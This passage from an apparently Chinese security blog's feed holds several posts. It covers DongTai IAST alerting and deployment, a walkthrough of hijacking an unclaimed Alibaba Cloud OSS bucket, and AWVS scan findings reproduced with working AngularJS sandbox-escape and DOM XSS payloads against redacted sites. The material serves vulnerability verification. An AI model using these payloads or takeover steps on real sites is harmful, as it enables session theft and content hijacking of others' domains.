class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新增业务线告警接收人</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">project_vul</span>(<span class="params">vul</span>):</span></span><br><span class="line">    <span class="keyword">if</span> vul.agent.project_name == <span class="string">&quot;project_1&quot;</span> <span class="keyword">or</span> vul.agent.project_name == <span class="string">&quot;project_2&quot;</span>:</span><br><span class="line">        phone = <span class="string">&quot;13111111111&quot;</span></span><br><span class="line">        send_vul_notify(vul, phone)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> vul.agent.project_name == <span class="string">&quot;project_3&quot;</span> <span class="keyword">or</span> vul.agent.project_name == <span class="string">&quot;project_4&quot;</span>:</span><br><span class="line">        phone = <span class="string">&quot;13222222222&quot;</span></span><br><span class="line">        send_vul_notify(vul, phone)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改发动报警方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_vul_notify</span>(<span class="params">vul, phone</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param vul_data:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    dingding = <span class="string">&quot;https://oapi.dingtalk.com/robot/send?access_token=xxx&quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Charset&quot;</span>: <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    message = &#123;</span><br><span class="line">        <span class="string">&quot;msgtype&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">        <span class="string">&quot;text&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: <span class="string">&quot;@&#123;&#125; 洞态IAST告警通知：\n漏洞类型：&#123;&#125;\n危害等级：&#123;&#125;\n漏洞URL：&#123;&#125;\n业务线名称：&#123;&#125;\n探针agent：&#123;&#125;\n请及时处理！！！&quot;</span>.<span class="built_in">format</span>(phone, vul.<span class="built_in">type</span>, vul.level.name_value, vul.url, vul.agent.project_name, vul.agent.token)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;at&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;atMobiles&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(phone)</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;isAtAll&quot;</span>: <span class="literal">False</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    resp = requests.post(url=dingding, headers=header, data=json.dumps(message))</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>然后修改 <code>handler_vul()</code> 方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> vul:</span><br><span class="line">    <span class="comment"># send_vul_notify(vul)</span></span><br><span class="line">    project_vul(vul)</span><br></pre></td></tr></table></figure><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><img src="/iast-dingding/dingding.png" class="" title="描述">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;洞态IAST上线有一段时间了，基于被动式IAST技术，高检出率和低误报率等特点，很好的集成到devops流程中，增加我们的效率，然而每次发现漏洞后没有及时查看导致漏洞处理上的滞后，这里通过钉钉群里机器人做自动化告警，使IAST使用上闭环起来&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
    <category term="DevSecOps" scheme="http://www.pa55w0rd.online/tags/DevSecOps/"/>
    
  </entry>
  
  <entry>
    <title>阿里云OSS Bucket 劫持</title>
    <link href="http://www.pa55w0rd.online/oss/"/>
    <id>http://www.pa55w0rd.online/oss/</id>
    <published>2021-07-15T02:25:25.000Z</published>
    <updated>2021-07-15T02:46:12.573Z</updated>
    
    <content type="html"><![CDATA[<h2 id="对象存储OSS"><a href="#对象存储OSS" class="headerlink" title="对象存储OSS"></a>对象存储OSS</h2><p>阿里云对象存储OSS（Object Storage Service）是一款海量、安全、低成本、高可靠的云存储服务，提供99.9999999999%(12个9)的数据持久性，99.995%的数据可用性。多种存储类型供选择，全面优化存储成本。</p><h2 id="劫持利用"><a href="#劫持利用" class="headerlink" title="劫持利用"></a>劫持利用</h2><p>访问某域名，提示 NoSuchBucket </p><span id="more"></span><img src="/oss/oss1.png" class="" title="描述"><p>获取信息，这个桶不存在</p><p>HostId : <code>baobao-tb.oss-cn-shenzhen.aliyuncs.com</code></p><p>BucketName : <code>baobao-tb</code></p><p>登陆阿里云，访问(OSS管理控制台)[<a href="https://oss.console.aliyun.com/overview]">https://oss.console.aliyun.com/overview]</a></p><h3 id="创建Bucket"><a href="#创建Bucket" class="headerlink" title="创建Bucket"></a>创建Bucket</h3><p>注意填写Bucket 名称和地域，和上面获取的信息保持一致</p><img src="/oss/oss2.png" class="" title="描述"><p>查看 Bucket 域名，可以看到创建成功</p><img src="/oss/oss3.png" class="" title="描述"><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>访问左侧菜单，选择上传文件，上传HTML文件，文件ACL 选择公共读就可以了</p><img src="/oss/oss4.png" class="" title="描述"><p>访问该该地址，发现已经劫持成功</p><img src="/oss/oss5.png" class="" title="描述"><img src="/oss/oss6.png" class="" title="描述">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;对象存储OSS&quot;&gt;&lt;a href=&quot;#对象存储OSS&quot; class=&quot;headerlink&quot; title=&quot;对象存储OSS&quot;&gt;&lt;/a&gt;对象存储OSS&lt;/h2&gt;&lt;p&gt;阿里云对象存储OSS（Object Storage Service）是一款海量、安全、低成本、高可靠的云存储服务，提供99.9999999999%(12个9)的数据持久性，99.995%的数据可用性。多种存储类型供选择，全面优化存储成本。&lt;/p&gt;
&lt;h2 id=&quot;劫持利用&quot;&gt;&lt;a href=&quot;#劫持利用&quot; class=&quot;headerlink&quot; title=&quot;劫持利用&quot;&gt;&lt;/a&gt;劫持利用&lt;/h2&gt;&lt;p&gt;访问某域名，提示 NoSuchBucket &lt;/p&gt;</summary>
    
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/categories/note/"/>
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>AWVS漏洞复现小记</title>
    <link href="http://www.pa55w0rd.online/awvs-vul/"/>
    <id>http://www.pa55w0rd.online/awvs-vul/</id>
    <published>2021-06-04T05:39:52.000Z</published>
    <updated>2021-06-04T10:02:25.166Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>AWVS作为黑盒测试，主动扫描的比较好用的工具，碰到部分网站扫描结果一堆漏洞，部分漏洞复现比较难，这里找了几个常见的，以往一直忽略的漏洞，详细研究一下，到最后成功复现</p><span id="more"></span><img src="/awvs-vul/1.png" class="" title="描述"><p>其中1、2、4漏洞比较难以复现，大家一般都是当作误报处理，这里记录一下</p><p>因使用汉化版，部分漏洞描述翻译可能存在问题，请忽略</p><h1 id="0x01-AngularJS-客户端模板注入"><a href="#0x01-AngularJS-客户端模板注入" class="headerlink" title="0x01 AngularJS 客户端模板注入"></a>0x01 AngularJS 客户端模板注入</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>此 Web 应用程序容易受到 AngularJS 客户端模板注入漏洞的攻击。当用户输入动态嵌入到使用 AngularJS 客户端模板的页面上时，会发生 AngularJS 客户端模板注入漏洞。通过使用大括号，可能将 AngularJS 表达式注入应用程序正在使用的 AngularJS 客户端模板中。这些表达式将由 AngularJS 在客户端进行求值，当与沙箱转义结合使用时，它们将允许攻击者执行任意 JavaScript 代码。</p><p>发现者 AngularJS 客户端模板注入</p><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>攻击者可以注入 AngularJS 表达式，这些表达式将在客户端进行评估。AngularJS 表达式通常并不是很危险，但是当与沙箱转义结合使用时，它们可使攻击者能够执行任意 JavaScript 代码。</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>攻击者不可能使用大括号插入 AngularJS 表达式。应用程序需要将用户输入中的大括号视为高度危险，或者完全避免在服务器端反射用户输入。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>URL: <code>https://xx.com/forget_pass.html</code></p><p>Parameter: <code>phone</code></p><p>URL encoded GET 输入 phone 已设置为 1zmvpmtruem5van。此输入已反映在 AngularJS 模板中。</p><p>这里访问URL可以看到，phone内容作为模板，动态生成HTML代码</p><p>访问：<code>https://xx.com/forget_pass.html?phone=13111&#123;&#123;8/2&#125;&#125;11111</code></p><p>执行了运算 8/2 观看页面中手机号变成了<code>13111411111</code>, 这里可以确定存在模板注入，下面来进一步利用一下</p><p>一般都是注入js代码，类似XSS效果弹个窗口</p><p>这里看了下AngularJS版本为1.5.5</p><img src="/awvs-vul/2.png" class="" title="描述"><p>1.5.5版本存在沙箱，需要绕过沙箱，这里从网上找到对应版本绕过沙箱方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a=toString().constructor.prototype;a.charAt=a.trim;$eval(<span class="string">&#x27;a,alert(/xss/),a&#x27;</span>)&#125;&#125;<span class="string">&#x27;);&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>成功复现弹窗</p><img src="/awvs-vul/3.png" class="" title="描述"><h1 id="0x02-DOM型跨站脚本"><a href="#0x02-DOM型跨站脚本" class="headerlink" title="0x02 DOM型跨站脚本"></a>0x02 DOM型跨站脚本</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>此脚本可能容易受到跨站脚本 (XSS) 攻击的攻击。</p><p>跨站脚本（也称为 XSS）是一个漏洞，允许攻击者向其他用户发送恶意代码（通常是 Javascript 的形式）。因为浏览器无法知道脚本是否可信，它将在用户上下文中执行脚本，这样，攻击者就可以访问浏览器保留的任何 cookie 或会话令牌。</p><p>传统的跨站点脚本漏洞发生在服务器端代码上，而基于文档对象模型的跨站点脚本是会影响客户端浏览器中脚本代码的漏洞类型。</p><p>发现者 DOM 型跨站脚本</p><h2 id="影响-1"><a href="#影响-1" class="headerlink" title="影响"></a>影响</h2><p>Malicious 用户可以将 JavaScript、VBScript、ActiveX、HTML 或 Flash 注入至易受攻击的应用程序，欺骗用户，以从这些用户处收集数据。攻击者可以窃取会话 cookie 并掌控帐户，以冒充用户，还可能修改用户能够看到的页面内容。</p><h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p>您的脚本应筛选来自用户输入的元字符。</p><h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p>URL: <code>https://xx.com/</code></p><p>Parameter: <code>window.location</code></p><p>这里访问URL, 确定输出位置<br><code>https://xx.com/?wvstest=javascript:domxssExecutionSink(1,&quot;&#39;\&quot;&gt;&lt;xsstag&gt;()locxss&quot;)#javascript:domxssExecutionSink(1,&quot;&#39;\&quot;&gt;&lt;xsstag&gt;()locxss&quot;)</code></p><img src="/awvs-vul/4.png" class="" title="描述"><p>查看 addFav()，通过window.location.href 获取当前页面的URL，然后写入到html中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addFav</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;a href=&quot;&#x27;</span> + <span class="built_in">window</span>.location.href + <span class="string">&#x27;&quot; title=&quot;&#x27;</span> + <span class="built_in">document</span>.title.replace(<span class="regexp">/&lt;|&gt;|&#x27;|&quot;|&amp;/g</span>, <span class="string">&#x27;&#x27;</span>) +</span><br><span class="line">        <span class="string">&#x27;&quot; rel=&quot;sidebar&quot; onclick=&quot;if(UA.indexOf(\&#x27;chrome\&#x27;) != -1)&#123;alert(\&#x27;&#x27;</span> + L[<span class="string">&#x27;chrome_fav_tip&#x27;</span>] +</span><br><span class="line">        <span class="string">&#x27;\&#x27;);return false;&#125;window.external.addFavorite(this.href, this.title);return false;&quot;&gt;&#x27;</span> + t + <span class="string">&#x27;&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后结果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://xx.com/?wvstest=javascript:domxssExecutionSink(1,%22%27\%22%3E%3Cxsstag%3E()locxss%22)#javascript:domxssExecutionSink(1,%22&#x27;\%22%3E%3Cxsstag%3E()locxss%22)&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;sidebar&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;if(UA.indexOf(&#x27;chrome&#x27;) != -1)&#123;alert(&#x27;请按快捷键Ctrl+D收藏本页，谢谢&#x27;);return false;&#125;window.external.addFavorite(this.href, this.title);return false;&quot;</span>&gt;</span>收藏本页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因a标签的href属性里面，对字符进行了url编码，没有绕过，这里先研究一下onclick里面的内容，先美化一下代码，这里可以看到判断为chrome浏览器直接退出，其他浏览器点击会添加到收藏，这里还是没有触发XSS</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (UA.indexOf(<span class="string">&#x27;chrome&#x27;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">    alert(<span class="string">&#x27;请按快捷键Ctrl+D收藏本页，谢谢&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.external.addFavorite(<span class="built_in">this</span>.href, <span class="built_in">this</span>.title);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>这里想到之前碰到过的XSS，chrome等浏览器会自动把参数进行url编码，这里换成IE内核的，IE浏览器不会自动url编码的</p><p>想到这里，打开IE，禁用XSS筛选器</p><p>访问 <a href="https://xx.com/#&quot;&gt;">https://xx.com/#&quot;&gt;</a>&lt;svg/onload=alert(/xss/)&gt; 成功发现弹窗</p><img src="/awvs-vul/5.png" class="" title="描述"><img src="/awvs-vul/6.png" class="" title="描述"><h1 id="0x03-跨站脚本"><a href="#0x03-跨站脚本" class="headerlink" title="0x03 跨站脚本"></a>0x03 跨站脚本</h1><p><strong>这里吐槽一下，为啥别人扫出来的漏洞直接就能复现，我扫出来的漏洞那么波折呢</strong></p><h2 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>跨站点脚本 (XSS) 是指客户端代码注入攻击，其中，攻击者可以将恶意脚本执行到合法的网站或 Web 应用程序中。当 Web 应用程序在其生成的输出中使用未经验证或未编码的用户输入时，就会发生 XSS。</p><p>发现者 跨站脚本</p><h2 id="影响-2"><a href="#影响-2" class="headerlink" title="影响"></a>影响</h2><p>恶意 JavaScript 可以访问与网页其余部分相同的所有对象，包括访问 cookie 和本地存储（通常用于存储会话令牌）。如果攻击者可以获取用户的会话 cookie，则他们可以冒充该用户。</p><p>此外，JavaScript 可以读取向用户显示的页面内容并进行任意修改。因此，XSS 与一些巧妙的社会工程技术相结合，为攻击者带来了很多可能性。</p><h2 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h2><p>对页面上呈现的用户输入应用上下文相关编码和/或验证</p><h2 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h2><p>URL: <code>https://xx.cn/index?returnUrl=</code></p><p>Parameter: <code>returnUrl</code></p><p>returnUrl？ 这里一般都会存在URL重定向漏洞吧，使用浏览器访问该URL，构造XSS查看结果</p><img src="/awvs-vul/7.png" class="" title="描述"><p>这一看结果，返回内容在json里面，<code>Content-Type</code> 也是 <code>application/json</code>，咋个绕过</p><p>咨询大佬，回应说是应该是IE特定条件下能触发，具体也不清楚</p><p>这里使用IE浏览器访问，结果直接就弹出是否下载了json文件</p><p>通过百度，搜索关键字，发现需要修改注册表，添加<code>json的mime类型</code>支持</p><p>如何修改自行百度吧</p><p>然后禁用IE浏览器的XSS筛选器，成功弹窗</p><img src="/awvs-vul/8.png" class="" title="描述"><h1 id="0x04-结束语"><a href="#0x04-结束语" class="headerlink" title="0x04 结束语"></a>0x04 结束语</h1><p>之前一直认为AWVS误报挺多的，这次扫描，比较严重的漏洞都成功复现了，当然漏洞影响有限，还浪费了很多查资料的时间，这里记录一下，方便以后使用，后续也会持续更新，补充一些新的漏洞。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;AWVS作为黑盒测试，主动扫描的比较好用的工具，碰到部分网站扫描结果一堆漏洞，部分漏洞复现比较难，这里找了几个常见的，以往一直忽略的漏洞，详细研究一下，到最后成功复现&lt;/p&gt;</summary>
    
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/categories/note/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
    <category term="note" scheme="http://www.pa55w0rd.online/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>洞态IAST落地实践</title>
    <link href="http://www.pa55w0rd.online/iast/"/>
    <id>http://www.pa55w0rd.online/iast/</id>
    <published>2021-05-14T03:19:42.000Z</published>
    <updated>2021-07-27T09:25:47.895Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>IAST作为开展sdl中黑白盒测试的有效补充，还是很有必要去了解使用的。笔者为了完善公司的SDL流程，调研了开源的IAST产品进行测试和内部推广</p></blockquote><span id="more"></span><p>刚开始，笔者测试<strong>百度OpenRASP</strong>的IAST功能（主动式IAST），OpenRASP的IAST通过对agent采集到的流量数据进行重放，根据hook点信息做选择性的扫描；与主动式漏扫相比，这种方式减少了很多请求，但是也会存在少量的脏数据，对测试不是很友好；OpenRASP的扫描器支持配置URL白名单，笔者通过对eidt、add、logout等接口加白，基本上解决了脏数据的问题，但是出现了很多漏报，而且基于重放HTTP请求的检测方式，对存在签名、防重放之类，无法进行HTTP请求重放的接口来说，基本无法进行扫描。</p><p>然后，看到火线开源了<strong>洞态IAST</strong>（被动式IAST），本地化部署及测试之后，发现比较符合预期，于是开始做各业务线的推广，与DevOps流程进行集成，目前已实现了新上线项目的<strong>IAST</strong>自动化部署。</p><p>关于洞态IAST介绍，可以直接查看<a href="https://hxsecurity.github.io/DongTaiDoc/#/README">官方文档</a>，接下来，主要分享一下IAST部署及其与DevOps集成的方案。</p><h3 id="一、云端服务介绍及部署"><a href="#一、云端服务介绍及部署" class="headerlink" title="一、云端服务介绍及部署"></a>一、云端服务介绍及部署</h3><h4 id="1-洞态IAST的架构图"><a href="#1-洞态IAST的架构图" class="headerlink" title="1. 洞态IAST的架构图"></a>1. 洞态IAST的架构图</h4><p><img src="https://huoxian-zone.oss-cn-beijing.aliyuncs.com/imagesframework.png" alt="技术架构图"></p><h4 id="2-IAST的基础服务"><a href="#2-IAST的基础服务" class="headerlink" title="2. IAST的基础服务"></a>2. IAST的基础服务</h4><p>“火线～洞态IAST”共有五个模块，分别是<code>DongTai-webapi</code>、<code>DongTai-openapi</code>、<code>DongTai-engine</code>、<code>DongTai-web</code>、<code>agent</code>，其中：</p><ul><li><p><strong>agent</strong>为各语言的数据采集端，从安装探针的项目中采集相对应的数据，发送至<code>DongTai-openapi</code>服务</p></li><li><p><strong>DongTai-web</strong> 为“火线～洞态IAST”的前端项目，负责页面展示</p></li><li><p><strong>DongTai-webapi</strong>用于与<code>DongTai-web</code>交互，负责处理用户相关的API请求</p></li><li><p><strong>DongTai-openapi</strong>用于与<code>agent</code>通信，处理agent上报的数据，向agent下发策略，控制agent的运行等</p></li><li><p><strong>DongTai-engine</strong>用于对<code>DongTai-openapi</code>接收到的数据进行分析、处理，计算存在的漏洞和可用的污点调用链等</p></li></ul><p>五个服务之间存在依赖关系，部署时，需按照以下顺序进行部署：</p><ul><li><p>DongTai-webapi</p></li><li><p>DongTai-openapi</p></li><li><p>DongTai-engine</p></li><li><p>DongTai-web</p></li><li><p>agent</p></li></ul><h4 id="3-本地部署洞态IAST的云端服务"><a href="#3-本地部署洞态IAST的云端服务" class="headerlink" title="3. 本地部署洞态IAST的云端服务"></a>3. 本地部署洞态IAST的云端服务</h4><p><strong>服务器信息</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">操作系统：CentOS Linux release <span class="number">7.9</span><span class="number">.2009</span> (Core)</span><br><span class="line">CPU：<span class="number">4</span>核</span><br><span class="line">内存：<span class="number">8</span>G</span><br><span class="line">硬盘：<span class="number">100</span>G</span><br></pre></td></tr></table></figure><p>拉取洞态项目代码后，执行<code>build.sh</code>脚本，一键部署<code>docker</code>环境（因为网络问题，代码总是拉取失败，根据shell脚本手动部署一下）</p><h5 id="1-拉取5个项目源码"><a href="#1-拉取5个项目源码" class="headerlink" title="1.  拉取5个项目源码"></a>1.  拉取5个项目源码</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 拉取最新的代码</span></span><br><span class="line">git clone git@github.com:HXSecurity/DongTai.git</span><br><span class="line"><span class="meta">#</span><span class="bash"> DongTai-webapi</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> DongTai-openapi</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> DongTai-engine</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> DongTai-web</span></span><br></pre></td></tr></table></figure><h5 id="2-创建虚拟网络"><a href="#2-创建虚拟网络" class="headerlink" title="2.  创建虚拟网络"></a>2.  创建虚拟网络</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker network rm dongtai-net || true</span><br><span class="line">docker network create dongtai-net</span><br></pre></td></tr></table></figure><h5 id="3-启动MySQL服务"><a href="#3-启动MySQL服务" class="headerlink" title="3.  启动MySQL服务"></a>3.  启动MySQL服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 进入DongTai项目下，使用docker启动mysql</span></span><br><span class="line">cd docker/mysql</span><br><span class="line">docker build -t huoxian/dongtai-mysql:5.7 .</span><br><span class="line">docker stop dongtai-mysql || true</span><br><span class="line">docker rm dongtai-mysql || true</span><br><span class="line">docker run -d --network dongtai-net --name dongtai-mysql --restart=always huoxian/dongtai-mysql:5.7</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者使用外部mysql，确保版本一致</span></span><br><span class="line">cd docker/mysql</span><br><span class="line">wget https://xxxx.xxxx.xxxx.xxxx/sca.sql</span><br><span class="line">wget https://xxxx.xxxx.xxxx.xxxx/rule.sql</span><br><span class="line">mysql -uroot -p&quot;dongtai-iast&quot; &lt; /opt/db.sql</span><br><span class="line">mysql -uroot -p&quot;dongtai-iast&quot; &lt; /opt/rule.sql</span><br><span class="line">mysql -uroot -p&quot;dongtai-iast&quot; &lt; /opt/sca.sql</span><br></pre></td></tr></table></figure><h5 id="4-启动redis服务"><a href="#4-启动redis服务" class="headerlink" title="4.  启动redis服务"></a>4.  启动redis服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 进入DongTai项目下，使用docker启动redis</span></span><br><span class="line">cd docker/redis</span><br><span class="line">docker build -t huoxian/dongtai-redis:latest .</span><br><span class="line">docker stop dongtai-redis || true</span><br><span class="line">docker rm dongtai-redis || true</span><br><span class="line">docker run -d --network dongtai-net --name dongtai-redis --restart=always huoxian/dongtai-redis:latest</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者使用外部redis</span></span><br><span class="line">redis-server /DongTai/docker/redis/redis.conf</span><br></pre></td></tr></table></figure><h5 id="5-启动dongtai-webapi服务"><a href="#5-启动dongtai-webapi服务" class="headerlink" title="5.  启动dongtai-webapi服务"></a>5.  启动dongtai-webapi服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 进入DongTai-webapi项目下</span></span><br><span class="line">cd DongTai-webapi</span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line">cp conf/config.ini.example conf/config.ini</span><br><span class="line">sed -i &quot;s/mysql-server/dongtai-mysql/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/mysql-port/3306/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/database_name/dongtai_webapi/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/mysql_username/root/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/mysql_password/dongtai-iast/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/redis_server/dongtai-redis/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/redis_port/6379/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/redis_password/123456/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/broker_db/0/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/engine_url/dongtai-engine:8000/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/api_server_url/dongtai-openapi:8000/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里dongtai-openapi需要修改为自己的ip</span></span><br><span class="line">docker build -t huoxian/dongtai-webapi:latest .</span><br><span class="line">docker stop dongtai-webapi || true</span><br><span class="line">docker rm dongtai-webapi || true</span><br><span class="line">docker run -d --network dongtai-net --name dongtai-webapi -e debug=false --restart=always huoxian/dongtai-webapi:latest</span><br></pre></td></tr></table></figure><h5 id="6-启动dongtai-openapi服务"><a href="#6-启动dongtai-openapi服务" class="headerlink" title="6.  启动dongtai-openapi服务"></a>6.  启动dongtai-openapi服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd DongTai-openapi</span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line">cp DongTai-webapi/conf/config.ini conf/config.ini</span><br><span class="line"></span><br><span class="line">docker build -t huoxian/dongtai-openapi:latest .</span><br><span class="line">docker stop 